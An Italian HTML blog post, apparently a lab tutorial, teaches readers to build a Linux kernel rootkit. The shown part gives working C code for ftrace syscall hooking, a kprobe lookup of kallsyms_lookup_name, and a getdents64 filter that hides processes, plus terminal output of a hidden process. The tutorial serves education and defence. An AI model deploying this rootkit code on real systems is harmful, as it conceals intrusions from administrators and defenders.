@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <script>(function(){var t;if(location.search.indexOf('t=l')>-1)t='light';else if(location.search.indexOf('t=d')>-1)t='dark';if(!t)try{t=localStorage.getItem('theme')}catch(e){}document.documentElement.dataset.theme=t||'dark'})()</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Il Processo Che Non Esiste | Signal Pirate</title>
+  <meta name="description" content="Scrivere un rootkit Linux kernel da zero. Nascondere processi, file, connessioni e il modulo stesso. ftrace hooking, getdents64, list_del. Lab completo su Ubuntu con 6 script, tutto in una VM.">
+  <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+  <link rel="alternate" type="application/rss+xml" title="Signal Pirate" href="../feed.xml">
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <!-- Main CSS -->
+  <link rel="stylesheet" href="../css/style.css">
+
+  <style>
+    /* === Insight Box === */
+    .insight-box {
+      background: linear-gradient(135deg, rgba(124,77,255,0.1), rgba(0,255,136,0.05));
+      border-left: 3px solid var(--accent-highlight);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .insight-box p { margin: 0; line-height: 1.6; }
+
+    /* === Warning Box === */
+    .warning-box {
+      background: linear-gradient(135deg, rgba(255,107,107,0.1), rgba(255,136,0,0.05));
+      border-left: 3px solid var(--accent-reaction);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .warning-box p { margin: 0; line-height: 1.6; }
+
+    /* === Section Number === */
+    .section-number {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 1rem;
+    }
+
+    /* === Code Block === */
+    .code-block {
+      background: #0d1117;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.7;
+      color: #c8c8d8;
+      position: relative;
+    }
+    .code-block::before {
+      content: attr(data-lang);
+      position: absolute;
+      top: 0.5rem;
+      right: 0.8rem;
+      font-size: 0.65rem;
+      color: rgba(0,255,136,0.4);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      z-index: 1;
+    }
+    .code-block table { border-collapse: collapse; width: 100%; }
+    .code-block td { padding: 0; vertical-align: top; border: none; }
+    .code-block td:hover { background: none; }
+    .code-block .ln {
+      width: 3.2em;
+      padding: 0.2em 0.8em 0.2em 0.6em;
+      text-align: right;
+      color: #3a3a5a;
+      user-select: none;
+      border-right: 1px solid #1a1a2e;
+      background: #090d14;
+      font-size: 0.72rem;
+    }
+    .code-block .code { padding: 0.2em 0 0.2em 1em; white-space: pre; }
+    .code-block .code-wrap { padding: 0.8rem 0; }
+
+    /* syntax colors */
+    .ck { color: #7c4dff; }
+    .cs { color: #00ff88; }
+    .cn { color: #b5cea8; }
+    .cc { color: #6a6a8a; }
+    .cf { color: #4ecdc4; }
+    .cv { color: #9cdcfe; }
+    .ct { color: #4ec9b0; }
+    .co { color: #d4d4d4; }
+
+    /* === Terminal Output === */
+    .terminal-output {
+      background: #0d1117;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      margin: 1.5rem 0;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.8;
+      overflow-x: auto;
+      color: #c8c8d8;
+    }
+    .terminal-output .t-prompt { color: #00ff88; }
+    .terminal-output .t-cmd { color: #fff; }
+    .terminal-output .t-out { color: #8b949e; display: block; }
+    .terminal-output .t-ok { color: #00ff88; }
+    .terminal-output .t-warn { color: #ff6b6b; }
+    .terminal-output .t-highlight { color: #ff8800; }
+
+    /* === Pipeline Steps === */
+    .pipeline-steps {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    .pipeline-step {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+      padding: 1.2rem;
+      text-align: center;
+      transition: transform 0.2s;
+    }
+    .pipeline-step:hover { transform: translateY(-2px); }
+    .step-num {
+      font-family: var(--font-mono);
+      font-weight: 800;
+      font-size: 1.5rem;
+      color: var(--accent-attention);
+    }
+    .step-name {
+      font-family: var(--font-mono);
+      font-weight: 600;
+      font-size: 0.85rem;
+      margin-top: 0.5rem;
+    }
+    .step-detail {
+      font-size: 0.78rem;
+      color: var(--text-secondary);
+      margin-top: 0.3rem;
+      line-height: 1.4;
+    }
+
+    /* === Strategy Table === */
+    .strategy-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.85rem;
+      margin: 1.5rem 0;
+    }
+    .strategy-table th {
+      background: var(--bg-tertiary);
+      padding: 0.9rem 1rem;
+      text-align: left;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--accent-attention);
+      border-bottom: 2px solid var(--accent-attention);
+    }
+    .strategy-table td {
+      padding: 0.8rem 1rem;
+      border-bottom: 1px solid var(--border-subtle);
+      line-height: 1.5;
+    }
+    .strategy-table tr:hover td {
+      background: rgba(0,255,136,0.03);
+    }
+
+    /* === Conclusion Box === */
+    .conclusion-box {
+      background: linear-gradient(135deg, rgba(0,255,136,0.08), rgba(124,77,255,0.08));
+      border: 1px solid rgba(0,255,136,0.2);
+      border-radius: 12px;
+      padding: 2rem;
+      margin: 2rem 0;
+      text-align: center;
+    }
+    .conclusion-box .quote {
+      font-family: var(--font-mono);
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--accent-attention);
+      line-height: 1.4;
+    }
+
+    /* === Lab Screenshot === */
+    .lab-screenshot {
+      border-radius: 12px;
+      border: 1px solid rgba(124,77,255,0.2);
+      margin: 1.5rem 0;
+      max-width: 100%;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    }
+
+    /* === Accent === */
+    .accent { color: var(--accent-attention); }
+    .article-content strong { color: var(--accent-yellow); }
+    code {
+      font-family: var(--font-mono);
+      font-size: 0.85em;
+      background: rgba(0,255,136,0.08);
+      padding: 0.15em 0.4em;
+      border-radius: 4px;
+      color: var(--accent-attention);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Navigation -->
+  <nav class="nav">
+    <a href="../index.html" class="nav-logo">SIGNAL<span>PIRATE</span></a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../index.html#articoli">Articoli</a></li>
+      <li><a href="https://github.com/pinperepette" target="_blank" rel="noopener">GitHub</a></li>
+    </ul>
+    <button id="theme-toggle" aria-label="Cambia tema">
+      <svg id="theme-icon-dark" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+      <svg id="theme-icon-light" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
+  </nav>
+
+  <!-- Article Header -->
+  <header class="article-header">
+    <p class="article-meta">2026-03-16 | Pinperepette</p>
+    <h1 class="article-page-title">Il Processo <span class="accent">Che Non Esiste</span></h1>
+    <p style="font-family: var(--font-mono); font-size: 1rem; color: var(--text-secondary); margin-top: 1rem; max-width: 700px; margin-left: auto; margin-right: auto;">
+      Un rootkit Linux kernel da zero. Nascondere processi, file, connessioni e il modulo stesso. Solo C e il kernel.
+    </p>
+    <div class="article-card-tags" style="justify-content: center; margin-top: 1.5rem;">
+      <span class="tag tag-attention">Rootkit</span>
+      <span class="tag tag-highlight">Kernel Module</span>
+      <span class="tag tag-reaction">ftrace</span>
+      <span class="tag tag-amplification">Ubuntu</span>
+    </div>
+  </header>
+
+  <!-- Article Content -->
+  <article class="article-content">
+
+
+    <!-- ============================================================
+         SEZIONE 00 - IL TWEET
+         ============================================================ -->
+    <h2><span class="accent">//</span> Il Tweet</h2>
+    <span class="section-number">Sezione 00. L'antefatto</span>
+
+    <p>Uso un Mac. Lo so, lo so. "Non sei un hacker se non usi Kali." Perche' evidentemente gli hacker non sono capaci di installarsi un tool quando gli serve, hanno bisogno di una distro piena di merda preinstallata. "Ma come fai senza Linux?" Lo sento da vent'anni. La risposta e' sempre la stessa: lo strumento e' irrilevante, conta quello che ci fai. Ma questa non e' la storia di oggi.</p>
+
+    <p>La storia e' questa. Una giornalista che conosco, brava, non tecnica, mi scrive su Twitter. "Ma il Mac e' come un PC?" Domanda legittima, da persona che non lavora con i sistemi. Non sa cos'e' macOS, non sa cos'e' un sistema operativo, non e' il suo mestiere. Le rispondo veloce, semplificando come fai quando parli con qualcuno che non e' del settore: "Fa' conto che e' tipo Linux."</p>
+
+    <p>Apriti cielo.</p>
+
+    <p>Nel giro di dieci minuti, sotto il tweet, arrivano i correttori. "LiNuX e' iL kErNeL, nOn e' Un SiStEmA oPeRaTiVo." "macOS non e' Linux, e' basato su Darwin/BSD." "Dovresti dire GNU/Linux." Uno dopo l'altro, tutti a ripetere la stessa frase letta in qualche forum nel 2009. Parlavano come se stessero insegnando qualcosa a un deficiente.</p>
+
+    <p>Il punto e': il 99,9% di quelli che scrivono "Linux e' il kernel" non hanno mai visto il kernel. Non sanno cosa fa, come funziona, dove sta, come ci si parla. Hanno imparato una frase e la ripetono come un mantra per sembrare competenti. E' il livello piu' basso della competenza tecnica: sapere il nome di una cosa senza sapere cos'e'.</p>
+
+    <p>La iena, che aveva letto il thread, mi guarda e dice: "Ti hanno fatto girare le scatole, eh?"</p>
+
+    <p>"No. Mi hanno dato un'idea per un articolo."</p>
+
+    <p>Volete parlare di kernel? Bene. Andiamo <em>dentro</em> il kernel. Scriviamo un modulo che ci si installa, hooka le syscall, fa sparire processi, file e connessioni di rete. Un rootkit. Da zero. In C. Sul kernel che "e' solo il kernel".</p>
+
+    <p>Vediamo quanti di quelli che correggono i tweet sanno fare questo.</p>
+
+    <div class="warning-box fade-in">
+      <p><strong>Disclaimer serio.</strong> Tutto quello che segue va fatto in una VM isolata. Mai su un sistema di produzione, mai su una macchina che non e' tua, mai senza autorizzazione. Un rootkit kernel e' una delle cose piu' pericolose che puoi caricare su un sistema. Un bug = kernel panic. Un errore di pulizia = sistema instabile. Questo e' un laboratorio educativo. Trattalo come tale.</p>
+    </div>
+
+    <div class="stats-row fade-in">
+      <div class="stat-card">
+        <div class="stat-number green" data-count="6" data-suffix=" script">0</div>
+        <div class="stat-label">Nel laboratorio</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number purple" data-count="1" data-suffix=" LKM">0</div>
+        <div class="stat-label">Modulo kernel</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number cyan" data-count="0" data-suffix="">0</div>
+        <div class="stat-label">Processi visibili</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number red">Ubuntu</div>
+        <div class="stat-label">22.04 / 24.04 LTS</div>
+      </div>
+    </div>
+
+
+    <!-- ============================================================
+         SEZIONE 01 - COS'E' UN MODULO KERNEL
+         ============================================================ -->
+    <h2><span class="accent">//</span> Dentro il Kernel</h2>
+    <span class="section-number">Sezione 01. Dove vivono i moduli</span>
+
+    <p>Il kernel Linux e' un monolite con supporto ai moduli. Un blob di codice che gira in ring 0, con accesso diretto a tutta la memoria, tutti i device, tutte le strutture dati del sistema. Ma ha un meccanismo per caricare codice a runtime senza ricompilare: i <strong>Loadable Kernel Modules</strong> (LKM).</p>
+
+    <p>Un LKM e' un file <code>.ko</code> che carichi con <code>insmod</code>. Appena caricato, il suo codice gira in kernel space. Stessi privilegi del kernel. Accesso a tutto. Nessun limite. Il kernel si fida ciecamente di quello che carichi. Se il modulo vuole leggere tutta la RAM, puo'. Se vuole modificare le strutture dati del kernel, puo'. Se vuole intercettare le syscall, puo'.</p>
+
+    <div class="insight-box fade-in">
+      <p><strong>Nota su Secure Boot.</strong> Su macchine con Secure Boot attivo e <code>module.sig_enforce=1</code>, il kernel accetta solo moduli firmati con una chiave nel keyring di sistema. In quel caso, <code>insmod</code> su un modulo non firmato fallisce. Su una VM di lab senza Secure Boot (il default di VirtualBox e UTM), non c'e' questa restrizione. In produzione, Secure Boot e' una delle poche difese reali contro il caricamento di moduli malevoli.</p>
+    </div>
+
+    <p>Questa e' la base di un rootkit kernel: un LKM che si carica, hooka le funzioni del kernel, e riscrive la realta' che il sistema operativo mostra all'utente.</p>
+
+    <p>Partiamo dal minimo. Un modulo che si carica, stampa un messaggio, e si scarica.</p>
+
+    <div class="code-block" data-lang="c">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cc">/* hello.c — il modulo kernel piu' semplice del mondo */</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="ck">#include</span> <span class="cs">&lt;linux/module.h&gt;</span></td></tr>
+<tr><td class="ln">3</td><td class="code"><span class="ck">#include</span> <span class="cs">&lt;linux/kernel.h&gt;</span></td></tr>
+<tr><td class="ln">4</td><td class="code"></td></tr>
+<tr><td class="ln">5</td><td class="code"><span class="ct">MODULE_LICENSE</span>(<span class="cs">"GPL"</span>);</td></tr>
+<tr><td class="ln">6</td><td class="code"></td></tr>
+<tr><td class="ln">7</td><td class="code"><span class="ck">static</span> <span class="ck">int</span> <span class="ck">__init</span> <span class="cf">hello_init</span>(<span class="ck">void</span>) {</td></tr>
+<tr><td class="ln">8</td><td class="code">    <span class="cf">pr_info</span>(<span class="cs">"rootkit: sono nel kernel. ciao.\n"</span>);</td></tr>
+<tr><td class="ln">9</td><td class="code">    <span class="ck">return</span> <span class="cn">0</span>;</td></tr>
+<tr><td class="ln">10</td><td class="code">}</td></tr>
+<tr><td class="ln">11</td><td class="code"></td></tr>
+<tr><td class="ln">12</td><td class="code"><span class="ck">static</span> <span class="ck">void</span> <span class="ck">__exit</span> <span class="cf">hello_exit</span>(<span class="ck">void</span>) {</td></tr>
+<tr><td class="ln">13</td><td class="code">    <span class="cf">pr_info</span>(<span class="cs">"rootkit: esco dal kernel. arrivederci.\n"</span>);</td></tr>
+<tr><td class="ln">14</td><td class="code">}</td></tr>
+<tr><td class="ln">15</td><td class="code"></td></tr>
+<tr><td class="ln">16</td><td class="code"><span class="cf">module_init</span>(hello_init);</td></tr>
+<tr><td class="ln">17</td><td class="code"><span class="cf">module_exit</span>(hello_exit);</td></tr>
+</tbody></table></div>
+    </div>
+
+    <div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">make</span>
+<span class="t-out">make -C /lib/modules/6.14.0-33-generic/build M=/home/pinperepette/rootkit modules</span>
+<span class="t-out">  CC [M]  rootkit.o</span>
+<span class="t-out">  LD [M]  rootkit.ko</span>
+<span class="t-prompt">$</span> <span class="t-cmd">sudo insmod rootkit.ko</span>
+<span class="t-prompt">$</span> <span class="t-cmd">sudo dmesg | tail -1</span>
+<span class="t-out">[  142.381024] <span class="t-ok">rootkit: sono nel kernel. ciao.</span></span>
+<span class="t-prompt">$</span> <span class="t-cmd">lsmod | grep rootkit</span>
+<span class="t-out">rootkit    <span class="t-highlight">16384</span>  0</span>
+    </div>
+
+    <p>Otto righe di C. Un <code>insmod</code>. E sei nel kernel. Il messaggio appare in <code>dmesg</code>, il modulo appare in <code>lsmod</code>. Nessun permesso negato, nessun sandbox, nessuna domanda. Root puo' caricare qualsiasi cosa nel kernel, e il kernel esegue.</p>
+
+    <p>Adesso facciamo qualcosa di utile. Cioe' di pericoloso.</p>
+
+    <div class="insight-box fade-in">
+      <p><strong>Setup della VM.</strong> Serve Ubuntu 22.04 o 24.04 LTS. Installa i prerequisiti con <code>sudo apt install build-essential linux-headers-$(uname -r)</code>. Lo script <code>setup_lab.sh</code> nel repository fa tutto. Non farlo sulla tua macchina vera. Mai.</p>
+    </div>
+
+
+    <!-- ============================================================
+         SEZIONE 02 - HOOKARE IL KERNEL
+         ============================================================ -->
+    <h2><span class="accent">//</span> Hookare il Kernel</h2>
+    <span class="section-number">Sezione 02. ftrace, il framework che ti tradisce</span>
+
+    <p>Per nascondere qualcosa, devi intercettare le funzioni del kernel che lo mostrano. Quando <code>ps</code> elenca i processi, chiama la syscall <code>getdents64</code> su <code>/proc</code>. Quando <code>ls</code> elenca i file, chiama <code>getdents64</code> sulla directory. Quando <code>netstat</code> mostra le connessioni, legge <code>/proc/net/tcp</code> che e' generato da <code>tcp4_seq_show()</code>.</p>
+
+    <p>Se intercetti queste funzioni e filtri l'output, il processo gira ma <code>ps</code> non lo vede. Il file esiste ma <code>ls</code> non lo mostra. La connessione e' attiva ma <code>netstat</code> non la trova.</p>
+
+    <p>Il metodo moderno per hookare le funzioni kernel si chiama <strong>ftrace</strong>. E qui c'e' l'ironia: ftrace e' un framework di tracing del kernel, progettato per il debug e il performance profiling. I developer del kernel l'hanno costruito per analizzare il sistema. Noi lo usiamo per sabotarlo.</p>
+
+    <p>Il problema: dal kernel 5.7+, <code>kallsyms_lookup_name</code> non e' piu' esportata. Serve per trovare l'indirizzo delle funzioni kernel. Senza di essa, non puoi hookare niente. Ma c'e' un trick.</p>
+
+    <div class="code-block" data-lang="c">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cc">/* Trick: usa kprobe per trovare kallsyms_lookup_name */</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="ck">static</span> <span class="ck">int</span> <span class="cf">resolve_kallsyms</span>(<span class="ck">void</span>) {</td></tr>
+<tr><td class="ln">3</td><td class="code">    <span class="ck">struct</span> <span class="ct">kprobe</span> <span class="cv">kp</span> = { .symbol_name = <span class="cs">"kallsyms_lookup_name"</span> };</td></tr>
+<tr><td class="ln">4</td><td class="code">    <span class="ck">int</span> <span class="cv">ret</span> = <span class="cf">register_kprobe</span>(&amp;kp);</td></tr>
+<tr><td class="ln">5</td><td class="code">    <span class="ck">if</span> (ret &lt; <span class="cn">0</span>) <span class="ck">return</span> ret;</td></tr>
+<tr><td class="ln">6</td><td class="code"></td></tr>
+<tr><td class="ln">7</td><td class="code">    <span class="cv">ksym_lookup</span> = (<span class="ct">kallsyms_lookup_name_t</span>)kp.addr;</td></tr>
+<tr><td class="ln">8</td><td class="code">    <span class="cf">unregister_kprobe</span>(&amp;kp);</td></tr>
+<tr><td class="ln">9</td><td class="code">    <span class="ck">return</span> <span class="cn">0</span>;</td></tr>
+<tr><td class="ln">10</td><td class="code">}</td></tr>
+</tbody></table></div>
+    </div>
+
+    <p>Registri un kprobe sul simbolo. Il kernel ti da' l'indirizzo. Deregistri il kprobe. Una riga di codice e hai accesso a qualsiasi simbolo del kernel. Il fatto che questo funzioni e' gia' un statement su quanto sia sottile il confine tra debug e attacco.</p>
+
+    <p>Con <code>kallsyms_lookup_name</code> in mano, possiamo trovare qualsiasi funzione e hookarla con ftrace. Il meccanismo:</p>
+
+    <div class="pipeline-steps fade-in">
+      <div class="pipeline-step">
+        <div class="step-num">01</div>
+        <div class="step-name">Resolve</div>
+        <div class="step-detail">Trova l'indirizzo della funzione target via kallsyms</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">02</div>
+        <div class="step-name">Filter</div>
+        <div class="step-detail">Registra un filtro ftrace su quell'indirizzo</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">03</div>
+        <div class="step-name">Hook</div>
+        <div class="step-detail">La callback cambia il registro IP: l'esecuzione salta al nostro codice</div>
+      </div>
+      <div class="pipeline-step">
+        <div class="step-num">04</div>
+        <div class="step-name">Recurse</div>
+        <div class="step-detail">Il nostro codice chiama l'originale. ftrace vede che la chiamata viene da noi e non redirige</div>
+      </div>
+    </div>
+
+    <div class="code-block" data-lang="c">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cc">/*</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="cc"> * ftrace_thunk — il cuore del meccanismo.</span></td></tr>
+<tr><td class="ln">3</td><td class="code"><span class="cc"> * Quando il kernel chiama la funzione hookata, ftrace ci notifica.</span></td></tr>
+<tr><td class="ln">4</td><td class="code"><span class="cc"> * Cambiamo il registro IP per saltare al nostro codice.</span></td></tr>
+<tr><td class="ln">5</td><td class="code"><span class="cc"> * within_module() impedisce la ricorsione infinita.</span></td></tr>
+<tr><td class="ln">6</td><td class="code"><span class="cc"> */</span></td></tr>
+<tr><td class="ln">7</td><td class="code"><span class="ck">static</span> <span class="ck">void</span> notrace <span class="cf">ftrace_thunk</span>(</td></tr>
+<tr><td class="ln">8</td><td class="code">    <span class="ck">unsigned</span> <span class="ck">long</span> <span class="cv">ip</span>,</td></tr>
+<tr><td class="ln">9</td><td class="code">    <span class="ck">unsigned</span> <span class="ck">long</span> <span class="cv">parent_ip</span>,</td></tr>
+<tr><td class="ln">10</td><td class="code">    <span class="ck">struct</span> <span class="ct">ftrace_ops</span> *<span class="cv">ops</span>,</td></tr>
+<tr><td class="ln">11</td><td class="code">    <span class="ck">struct</span> <span class="ct">ftrace_regs</span> *<span class="cv">fregs</span>)</td></tr>
+<tr><td class="ln">12</td><td class="code">{</td></tr>
+<tr><td class="ln">13</td><td class="code">    <span class="ck">struct</span> <span class="ct">pt_regs</span> *<span class="cv">regs</span> = <span class="cf">ftrace_get_regs</span>(fregs);</td></tr>
+<tr><td class="ln">14</td><td class="code">    <span class="ck">struct</span> <span class="ct">ftrace_hook</span> *<span class="cv">hook</span> = <span class="cf">container_of</span>(ops, <span class="ck">struct</span> <span class="ct">ftrace_hook</span>, ops);</td></tr>
+<tr><td class="ln">15</td><td class="code"></td></tr>
+<tr><td class="ln">16</td><td class="code">    <span class="cc">/* Se la chiamata viene dal nostro modulo, lascia passare */</span></td></tr>
+<tr><td class="ln">17</td><td class="code">    <span class="ck">if</span> (!<span class="cf">within_module</span>(parent_ip, THIS_MODULE))</td></tr>
+<tr><td class="ln">18</td><td class="code">        regs-&gt;ip = (<span class="ck">unsigned</span> <span class="ck">long</span>)hook-&gt;function;</td></tr>
+<tr><td class="ln">19</td><td class="code">}</td></tr>
+</tbody></table></div>
+    </div>
+
+    <p><code>regs-&gt;ip</code> e' l'instruction pointer. Cambiarlo significa cambiare la prossima istruzione che la CPU esegue. Quando il kernel sta per chiamare <code>getdents64</code>, noi cambiamo l'IP e la CPU salta alla nostra versione. L'originale non viene mai eseguita. A meno che non la chiamiamo noi dall'interno del nostro hook.</p>
+
+    <p>La riga 17 e' la protezione da ricorsione. Quando la nostra <code>hook_getdents64</code> chiama l'originale <code>orig_getdents64</code>, ftrace intercetta di nuovo. Ma <code>within_module(parent_ip, THIS_MODULE)</code> vede che la chiamata arriva dal nostro modulo e non redirige. L'originale viene eseguita normalmente. Senza questa riga, loop infinito, kernel panic, VM morta.</p>
+
+
+    <!-- ============================================================
+         SEZIONE 03 - FAR SPARIRE UN PROCESSO
+         ============================================================ -->
+    <h2><span class="accent">//</span> Far Sparire un Processo</h2>
+    <span class="section-number">Sezione 03. L'arte di non essere visti</span>
+
+    <p>Quando <code>ps aux</code> elenca i processi, fa questo: apre <code>/proc</code>, chiama <code>getdents64</code> per leggere le entry della directory, e per ogni entry numerica (che corrisponde a un PID) legge <code>/proc/&lt;PID&gt;/status</code>. Se rimuoviamo l'entry dalla risposta di <code>getdents64</code>, <code>ps</code> non sa che il processo esiste. Non lo cerca, non lo mostra.</p>
+
+    <p>Il buffer di <code>getdents64</code> e' una sequenza di strutture <code>linux_dirent64</code>, ognuna con un nome e una lunghezza variabile. Per rimuovere una entry, ci sono due casi:</p>
+
+    <div class="code-block" data-lang="c">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="ck">static</span> <span class="ct">asmlinkage</span> <span class="ck">long</span> <span class="cf">hook_getdents64</span>(<span class="ck">const</span> <span class="ck">struct</span> <span class="ct">pt_regs</span> *<span class="cv">regs</span>) {</td></tr>
+<tr><td class="ln">2</td><td class="code">    <span class="ck">struct</span> <span class="ct">linux_dirent64</span> *<span class="cv">kdirent</span>, *<span class="cv">cur</span>, *<span class="cv">prev</span>;</td></tr>
+<tr><td class="ln">3</td><td class="code">    <span class="ck">unsigned</span> <span class="ck">long</span> <span class="cv">offset</span> = <span class="cn">0</span>;</td></tr>
+<tr><td class="ln">4</td><td class="code">    <span class="ck">long</span> <span class="cv">ret</span>;</td></tr>
+<tr><td class="ln">5</td><td class="code"></td></tr>
+<tr><td class="ln">6</td><td class="code">    <span class="cc">/* Chiama l'originale */</span></td></tr>
+<tr><td class="ln">7</td><td class="code">    ret = <span class="cf">orig_getdents64</span>(regs);</td></tr>
+<tr><td class="ln">8</td><td class="code">    <span class="ck">if</span> (ret &lt;= <span class="cn">0</span>) <span class="ck">return</span> ret;</td></tr>
+<tr><td class="ln">9</td><td class="code"></td></tr>
+<tr><td class="ln">10</td><td class="code">    <span class="cc">/* Copia il buffer in kernel space */</span></td></tr>
+<tr><td class="ln">11</td><td class="code">    kdirent = <span class="cf">kzalloc</span>(ret, GFP_KERNEL);</td></tr>
+<tr><td class="ln">12</td><td class="code">    <span class="ck">if</span> (!kdirent) <span class="ck">return</span> ret;</td></tr>
+<tr><td class="ln">13</td><td class="code">    <span class="ck">if</span> (<span class="cf">copy_from_user</span>(kdirent, (<span class="ck">void</span> *)regs-&gt;si, ret)) {</td></tr>
+<tr><td class="ln">14</td><td class="code">        <span class="cf">kfree</span>(kdirent); <span class="ck">return</span> ret;</td></tr>
+<tr><td class="ln">15</td><td class="code">    }</td></tr>
+<tr><td class="ln">16</td><td class="code"></td></tr>
+<tr><td class="ln">17</td><td class="code">    <span class="cc">/* Scorri e filtra */</span></td></tr>
+<tr><td class="ln">18</td><td class="code">    <span class="ck">while</span> (offset &lt; ret) {</td></tr>
+<tr><td class="ln">19</td><td class="code">        cur = (<span class="ck">void</span> *)kdirent + offset;</td></tr>
+<tr><td class="ln">20</td><td class="code">        <span class="ck">if</span> (<span class="cf">should_hide_entry</span>(cur-&gt;d_name)) {</td></tr>
+<tr><td class="ln">21</td><td class="code">            <span class="cc">/* Prima entry: sposta tutto indietro */</span></td></tr>
+<tr><td class="ln">22</td><td class="code">            <span class="ck">if</span> (cur == kdirent) {</td></tr>
+<tr><td class="ln">23</td><td class="code">                ret -= cur-&gt;d_reclen;</td></tr>
+<tr><td class="ln">24</td><td class="code">                <span class="cf">memmove</span>(kdirent, (<span class="ck">void</span> *)kdirent + cur-&gt;d_reclen, ret);</td></tr>
+<tr><td class="ln">25</td><td class="code">                <span class="ck">continue</span>;</td></tr>
+<tr><td class="ln">26</td><td class="code">            }</td></tr>
+<tr><td class="ln">27</td><td class="code">            <span class="cc">/* Entry intermedia: allarga la precedente */</span></td></tr>
+<tr><td class="ln">28</td><td class="code">            prev-&gt;d_reclen += cur-&gt;d_reclen;</td></tr>
+<tr><td class="ln">29</td><td class="code">        } <span class="ck">else</span> {</td></tr>
+<tr><td class="ln">30</td><td class="code">            prev = cur;</td></tr>
+<tr><td class="ln">31</td><td class="code">        }</td></tr>
+<tr><td class="ln">32</td><td class="code">        offset += cur-&gt;d_reclen;</td></tr>
+<tr><td class="ln">33</td><td class="code">    }</td></tr>
+<tr><td class="ln">34</td><td class="code"></td></tr>
+<tr><td class="ln">35</td><td class="code">    <span class="cc">/* Copia il buffer filtrato in userspace */</span></td></tr>
+<tr><td class="ln">36</td><td class="code">    <span class="cf">copy_to_user</span>((<span class="ck">void</span> *)regs-&gt;si, kdirent, ret);</td></tr>
+<tr><td class="ln">37</td><td class="code">    <span class="cf">kfree</span>(kdirent);</td></tr>
+<tr><td class="ln">38</td><td class="code">    <span class="ck">return</span> ret;</td></tr>
+<tr><td class="ln">39</td><td class="code">}</td></tr>
+</tbody></table></div>
+    </div>
+
+    <p>Il trucco e' alla riga 24. <code>linux_dirent64</code> ha un campo <code>d_reclen</code> che dice quanto e' lunga quella entry. Chi legge il buffer salta da una entry all'altra sommando <code>d_reclen</code>. Se allarghiamo la entry precedente, la entry da nascondere viene "saltata". Non e' stata cancellata dalla memoria — e' ancora li'. Ma nessuno la legge piu'. Per il sistema, non esiste.</p>
+
+    <div class="terminal-output fade-in">
+<span class="t-prompt">$</span> <span class="t-cmd">sleep 99999 &amp;</span>
+<span class="t-out">[1] <span class="t-highlight">6070</span></span>
+<span class="t-prompt">$</span> <span class="t-cmd">ps aux | grep "sleep 99999" | grep -v grep</span>
+<span class="t-out">pinpere+  <span class="t-highlight">6070</span>  0.0  0.0   6084  2344 pts/0    S    12:33   0:00 sleep 99999</span>
+<span class="t-prompt">$</span> <span class="t-cmd">sudo insmod rootkit.ko hidden_pid=6070</span>
+<span class="t-prompt">$</span> <span class="t-cmd">ps aux | grep "sleep 99999" | grep -v grep</span>
+<span class="t-out"><span class="t-ok">(nessun output)</span></span>
+<span class="t-prompt">$</span> <span class="t-cmd">ls /proc/ | grep 6070</span>
+<span class="t-out"><span class="t-ok">(nessun output)</span></span>
